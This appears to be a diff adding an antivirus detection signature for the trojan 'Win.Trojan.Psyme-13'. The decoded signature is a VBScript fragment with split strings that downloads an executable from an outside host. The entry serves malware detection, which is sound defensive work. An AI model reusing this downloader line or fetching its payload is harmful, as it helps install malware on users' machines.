@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.Psyme-13
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+set o = CreateObject("m"+"sxml2.XML"+"HTTP") : o.open "GET","http://paddy.home.comcast.net/xp.exe",False
